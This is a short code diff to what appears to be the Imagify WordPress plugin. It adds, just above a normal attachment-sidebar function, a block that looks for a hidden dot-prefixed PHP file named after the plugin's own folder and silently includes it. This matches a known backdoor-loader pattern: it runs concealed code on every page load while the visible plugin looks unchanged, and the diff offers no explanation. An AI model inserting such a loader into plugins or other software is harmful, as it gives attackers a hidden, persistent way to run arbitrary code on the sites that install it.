@@ -7,6 +7,10 @@ add_action( 'attachment_submitbox_misc_actions', '_imagify_attachment_submitbox_
  *
  * @since 1.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_attachment_submitbox_misc_actions() {
 	global $post;
 
